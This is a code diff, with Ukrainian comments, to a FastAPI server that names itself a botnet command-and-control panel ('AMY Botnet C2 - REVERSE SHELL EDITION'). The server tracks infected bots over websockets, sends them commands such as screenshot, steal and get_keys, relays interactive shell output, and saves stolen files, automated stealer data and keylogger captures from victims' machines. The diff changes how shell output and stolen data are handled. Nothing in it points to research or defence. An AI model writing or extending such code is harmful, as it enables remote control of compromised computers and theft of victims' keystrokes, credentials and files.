@@ -5,18 +5,16 @@ import base64
 import os
 from datetime import datetime
 
-app = FastAPI(title="AMY Botnet C2 - STEAL MODE")
+app = FastAPI(title="AMY Botnet C2 - REVERSE SHELL EDITION")
 
-# Визначаємо шлях до папки з UI
+# Шляхи до папок (в межах контейнера /app)
 current_file_path = os.path.abspath(__file__)
 project_root = os.path.dirname(os.path.dirname(current_file_path))
 ui_path = os.path.join(project_root, "ui")
 
-# Створюємо папки для даних
-os.makedirs("screenshots", exist_ok=True)
-os.makedirs("logs", exist_ok=True)
-os.makedirs("downloads", exist_ok=True)
-os.makedirs("stealer", exist_ok=True) # Папка для автоматично вкрадених даних
+# Створення необхідних папок
+for folder in ["screenshots", "logs", "downloads", "stealer"]:
+    os.makedirs(folder, exist_ok=True)
 
 active_bots = {}
 bot_responses = {}
@@ -62,18 +60,22 @@ async def view_screenshot(bot_id: str):
 
 @app.get("/download_file/{filename}")
 async def download_stolen_file(filename: str):
-    # Дозволяємо скачування і з downloads, і з stealer
-    fpath_down = os.path.join("downloads", filename)
-    fpath_steal = os.path.join("stealer", filename)
-    
-    if os.path.exists(fpath_down): return FileResponse(path=fpath_down, filename=filename)
-    if os.path.exists(fpath_steal): return FileResponse(path=fpath_steal, filename=filename)
+    # Пошук файлу в папках downloads та stealer
+    for folder in ["downloads", "stealer"]:
+        fpath = os.path.join(folder, filename)
+        if os.path.exists(fpath): return FileResponse(path=fpath, filename=filename)
     return {"error": "File not found"}
 
 @app.post("/command")
 async def send_command(bot_id: str, command: str):
     if bot_id in active_bots:
-        bot_responses[bot_id] = "Waiting for bot..." 
+        # Для інтерактивності ми не перезаписуємо bot_responses текстом "Waiting..."
+        # щоб не перебивати потік виводу з Shell
+        if command not in ["screenshot", "steal", "get_keys"]:
+            bot_responses[bot_id] = "> Executing: " + command
+        else:
+            bot_responses[bot_id] = "Processing specialized command..."
+            
         await active_bots[bot_id].send_text(encrypt(command))
         return {"status": "success"}
     return {"status": "error"}
@@ -94,34 +96,29 @@ async def websocket_endpoint(websocket: WebSocket, bot_id: str):
                 last_screenshot_data[bot_id] = img_bytes
                 bot_responses[bot_id] = "SCREENSHOT_LOADED"
             
-            # Обробка ручного скачування файлів
+            # Обробка передачі файлів
             elif data.startswith("FILE_DATA:"):
-                # Формат: FILE_DATA:filename:base64
                 parts = data.split(":", 2)
                 fname = f"{bot_id}_{parts[1]}"
                 with open(f"downloads/{fname}", "wb") as f: f.write(base64.b64decode(parts[2]))
                 bot_responses[bot_id] = f"FILE_SAVED:{fname}"
             
-            # Обробка автоматично вкрадених даних (стілер)
+            # Обробка автоматичного стілера
             elif data.startswith("STEAL_DATA:"):
-                # Формат: STEAL_DATA:type:filename:base64
                 parts = data.split(":", 3)
-                s_type = parts[1]
-                fname = parts[2]
-                f_bytes = base64.b64decode(parts[3])
-                
-                # Зберігаємо в окрему папку, додаючи тип
+                s_type, fname, b64_data = parts[1], parts[2], parts[3]
                 save_path = f"stealer/{bot_id}_{s_type}_{fname}"
-                with open(save_path, "wb") as f: f.write(f_bytes)
-                bot_responses[bot_id] = f"Stealer data received ({s_type})."
-                
+                with open(save_path, "wb") as f: f.write(base64.b64decode(b64_data))
+                # Тут ми не міняємо статус, щоб не забивати термінал під час масової пересилки
+            
             # Обробка кейлоггера
             elif data.startswith("KEYLOG:"):
                 with open(f"logs/{bot_id}.txt", "a") as f: f.write(data[7:] + "\n")
-                bot_responses[bot_id] = "Keylog packet received."
+                bot_responses[bot_id] = "Keylog updated."
             
-            # Звичайна відповідь
+            # Обробка виводу Shell (та всього іншого)
             else:
                 bot_responses[bot_id] = data
     except WebSocketDisconnect:
         if bot_id in active_bots: del active_bots[bot_id]
+
